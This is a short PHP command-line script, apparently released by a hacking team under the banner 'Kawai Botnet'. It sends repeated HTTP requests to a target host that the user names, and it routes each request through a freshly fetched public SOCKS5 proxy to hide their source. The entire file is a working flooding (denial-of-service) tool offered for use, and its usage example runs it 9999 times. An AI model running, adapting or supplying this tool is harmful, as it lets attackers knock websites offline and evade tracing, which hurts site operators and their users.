#!/usr/bin/env php
<?php
set_time_limit(0);
if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
    $R  = "";
    $RR = "";
    $G  = "";
    $GG = "";
    $B  = "";
    $BB = "";
    $Y  = "";
    $YY = "";
    $X  = "";
    $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0";
} else {
    $R  = "\e[91m";
    $RR = "\e[91;7m";
    $G  = "\e[92m";
    $GG = "\e[92;7m";
    $B  = "\e[36m";
    $BB = "\e[36;7m";
    $Y  = "\e[93m";
    $YY = "\e[93;7m";
    $X  = "\e[0m";
    $ua = "Mozilla/5.0 (Linux; Android 5.1.1; Andromax A16C3H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36";
    system("clear");
}
	
echo $G."
 ._________________.
 | _______________ |
 | I             I |
 | I Kawai       I |
 | I     <>      I |
 | I      Botnet I |
 | I_____________I |
 !_________________!
    ._[_______]_.
.___|___________|___.
|::: ____           |
|    ~~~~ [CD-ROM]  |
!___________________!";
echo $R."\n++++++++++++++++++++++++++++++++++++++";
echo $B."\nAuthor  : Cvar1984                   ".$R."+";
echo $B."\nGithub  : https://github.com/Cvar1984".$R."+";
echo $B."\nTeam    : BlackHole Security         ".$R."+";
echo $B."\nVersion : 0.1                        ".$R."+";
echo $B."\nDate    : 29-04-2018                 ".$R."+";
echo $R."\n++++++++++++++++++++++++++++++++++++++".$G."\n\n";
if(isset($argv[1]) AND isset($argv[2]) AND isset($argv[3]) AND isset($argv[4])) {
	for($x=0;$x<$argv[4];$x++) {
	$proxy=json_decode(file_get_contents("http://pubproxy.com/api/proxy"),1);
	echo "Connecting To\t=> ".$proxy['data'][0]['ip'].':'.$proxy['data'][0]['port']."\n";
	echo "Attacking\t=> ".$argv[1]."\n";
	$ch=curl_init($argv[1]);
	//curl_setopt($ch, CURLOPT_PORT, $port);
	curl_setopt($ch, CURLOPT_USERAGENT, $ua);
	curl_setopt($ch, CURLOPT_PROXY, $proxy['data'][0]['ip'].':'.$proxy['data'][0]['port']);
	//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth); 
	curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt($ch, CURLOPT_HEADER, 1);
   curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $argv[2]);
   curl_setopt($ch, CURLOPT_TIMEOUT, $argv[3]);
	$isi=curl_exec($ch);
	$info=curl_getinfo($ch, CURLINFO_HTTP_CODE);
	curl_close($ch);
	//echo $isi."\n";
	//echo $info."\n";
}
} else {
	echo $Y.$argv[0]." [host] [timeout connection] [timeout] [times]\n";
	echo 'Example : '.$YY.'php '.$argv[0].' 127.0.0.1 4 0 9999'.$X."\n";
}